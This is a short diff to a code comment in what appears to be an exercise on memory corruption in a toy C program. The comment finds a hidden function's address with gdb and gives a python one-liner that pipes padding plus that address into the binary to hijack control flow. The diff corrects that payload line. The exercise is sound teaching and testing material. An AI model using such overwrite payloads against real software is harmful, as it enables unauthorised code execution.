@@ -19,7 +19,7 @@
  * (gdb) p &super_secret_function_DONOTCALL
  * $1 = (void (*)()) 0x400557 <super_secret_function_DONOTCALL>
  *
- * python3 -c "print(0x400557.to_bytes(4, byteorder='little'))" | a.out
+ * python3 -c "import sys; sys.stdout.buffer.write(b'AAAA' + 0x400557.to_bytes(4, byteorder='little'))" | a.out
  *
  * Now the program should output "bingus bongus sproingus" instead of "cleaned up".
  */
